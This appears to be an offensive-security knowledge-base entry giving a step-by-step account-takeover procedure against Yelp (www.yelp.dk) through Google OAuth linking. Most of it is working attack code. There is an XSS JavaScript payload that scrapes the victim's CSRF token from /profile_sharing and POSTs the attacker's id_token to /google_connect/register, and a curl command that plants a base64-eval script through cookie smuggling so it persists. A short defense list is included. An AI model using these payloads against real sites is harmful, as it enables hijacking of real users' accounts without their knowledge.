---
tags:
  - account-takeover
  - google-oauth
  - xss
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/CyberChef]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/generate-id-token]]'
  - '[[commands/deploy-ato-payload]]'
  - '[[commands/post-google-register]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:34.342Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 8e183014-54f1-4fee-a31d-104d920a352f
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[JavaScript]]'
---
# Perform Account Takeover via Google Linking

## Summary

This procedure uses XSS to fetch the victim's CSRF token from /profile_sharing, then POSTs the attacker's Google id_token to /google_connect/register, linking accounts and enabling takeover of the victim's Yelp profile.

## Description

Attacker first generates an id_token by linking their own Google account and capturing it via Burp. The JS payload uses XMLHttpRequest to extract csrftok via regex from /profile_sharing response, then submits to /google_connect/register. Injected via cookie smuggling for persistence. Target: www.yelp.dk (or similar). Prerequisites: Attacker Google account, smuggling setup. Outcomes: Victim's Yelp account linked to attacker's Google, granting full access.

## Requirements

1. Attacker's Google account with id_token
2. Burp for interception
3. CyberChef for encoding
4. Victim session on Yelp

## Defense

Defensive measures and detection strategies:

- Strengthen CSRF protection (e.g., double-submit or token binding)
- Validate id_token origins and scopes in OAuth flow
- Monitor for unauthorized POSTs to /google_connect/register
- Rate-limit profile sharing endpoints

## Objectives

1. Extract victim's CSRF token silently
2. Link attacker's Google account
3. Achieve ATO without credentials

## Instructions

### Step 1: Generate id_token

**Context**: Link attacker's Google and capture token.

**Command** ([[commands/generate-id-token]]):
Visit /profile_sharing, intercept POST to /google_connect/register in Burp, extract id_token from request body.

```http
POST /google_connect/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded
id_token=eyJhbGciOiJSUzI1NiIs...&csrftok=...
```

> Expected: Valid JWT id_token for attacker's account.

### Step 2: Craft ATO JS

**Context**: Build payload to fetch csrftok and POST.

**Command** (JS):

```javascript
(function f(){ a =new XMLHttpRequest(); a.addEventListener('load',function(){ rx =/"GoogleConnect": "([^"]*)/; id_token ="[ATTACKER_ID_TOKEN]"; b = rx.exec(this.responseText); fetch("https://www.yelp.dk/google_connect/register",{"method":"POST","body":new URLSearchParams({"id_token": id_token,"csrftok": b[1]})}) }); a.open('GET','https://www.yelp.dk/profile_sharing'); a.send(); })();
```

> Replace [ATTACKER_ID_TOKEN]. Expected: Extracts and submits token.

### Step 3: Encode and Deploy

**Context**: Prepare and smuggle payload.

**Command** ([[commands/deploy-ato-payload]]):
Use CyberChef to encode JS (similar to keylogger), then:

```bash
curl "https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval(atob('[ENCODED_JS]'))%3C%2Fscript%3E%3BMax-Age%3D99999999" -c cookies.txt
```

> Expected: Payload executes on victim visit.

### Step 4: Verify Linking

**Context**: Confirm POST success.

**Command** ([[commands/post-google-register]]):

```bash
curl -X POST "https://www.yelp.dk/google_connect/register" -d "id_token=[ID_TOKEN]&csrftok=[CSRFTok]" -v
```

> Expected: 200 OK; account linked.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Account Manipulation]] Account Manipulation
- [[JavaScript]] JavaScript

### Sub-Techniques

-

## Commands Used

- [[commands/generate-id-token]]
- [[commands/deploy-ato-payload]]
- [[commands/post-google-register]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/CyberChef]]

## Tags

- account-takeover
- google-oauth
- xss
